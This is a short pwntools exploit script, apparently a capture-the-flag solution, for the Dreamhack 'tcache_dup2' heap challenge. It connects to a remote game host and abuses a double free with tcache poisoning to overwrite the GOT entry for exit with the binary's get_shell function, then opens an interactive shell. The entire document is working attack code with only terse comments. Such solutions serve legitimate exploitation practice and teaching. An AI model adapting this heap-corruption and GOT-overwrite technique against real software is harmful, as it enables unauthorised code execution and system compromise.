#!/usr/bin/env python3

from pwn import *

exe = ELF("./tcache_dup2_patched", checksec=False)
libc = ELF("./libc.so.6", checksec=False)
ld = ELF("./ld-2.30.so", checksec=False)
context.binary = exe

if args.LOCAL:
    p = process([exe.path])
else:
    p = remote("host3.dreamhack.games", 17056)

def create_heap(size, data):
	p.sendlineafter(b'> ', str(1))
	p.sendlineafter(b'Size: ', str(size))
	p.sendafter(b'Data: ', data)

def modify_heap(idx, size, data):
	p.sendlineafter(b'> ', str(2))
	p.sendlineafter(b'idx: ', str(idx))
	p.sendlineafter(b'Size: ', str(size))
	p.sendafter(b'Data: ', data)

def delete_heap(idx):
	p.sendlineafter(b'> ', str(3))
	p.sendlineafter(b'idx: ', str(idx))

input()

# Double-Free
create_heap(0x10, b'a'*8) # 0
create_heap(0x10, b'b'*8) # 1
delete_heap(0)
delete_heap(1)
# 1 -> 0
modify_heap(1, 0x10, b'a'*8 + p64(1))
# 1 <- data
delete_heap(1)
# 1 <- 1

# Get shell
create_heap(0x10, p64(exe.got['exit'])) # 1
# 1 -> exit
create_heap(0x10, b'c'*8) # 1
# exit
create_heap(0x10, p64(exe.sym['get_shell'])) # 0
delete_heap(7)

p.interactive()